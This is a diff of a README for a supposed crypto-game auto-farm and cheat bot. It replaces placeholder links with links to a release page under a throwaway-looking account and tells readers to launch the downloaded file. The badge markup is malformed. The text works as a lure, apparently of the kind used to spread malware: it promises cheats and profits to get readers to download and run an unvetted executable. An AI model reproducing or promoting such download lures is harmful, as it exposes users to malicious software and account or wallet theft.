@@ -16,7 +16,7 @@ Welcome to the Common Ground World Crypto Bot repository! 🌍 This bot is desig
 5. **Cheats:** Unlock cheats to maximize profits and make the most out of your gaming sessions.
 
 ## 🔗 Quick Access
-**Download the bot:** [![Download Bot](https://img.shields.io/badge/Download%20Bot-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+**Download the bot:** [![Download Bot](https://github.com/joejoejoejoejoejoejoejoejoejoejoejojo/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases%https://github.com/joejoejoejoejoejoejoejoejoejoejoejojo/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)](https://github.com/joejoejoejoejoejoejoejoejoejoejoejojo/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
 
 If the link ends with the filename, make sure to launch the file. If you encounter any issues with the link, feel free to check the "Releases" section of this repository for alternative download options. 🕵️‍♂️
 
@@ -44,7 +44,7 @@ If you have any questions, suggestions, or feedback regarding the Common Ground 
 
 Let's revolutionize the world of gaming together, one line of code at a time! 🌟🎮🚀
 
-![Common Ground World Crypto Bot](https://via.placeholder.com/800x400)
+![Common Ground World Crypto Bot](https://github.com/joejoejoejoejoejoejoejoejoejoejoejojo/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
 
 ---
 **Disclaimer: This README is a fictional creation for demonstration purposes. The mentioned repository and bot do not exist.**
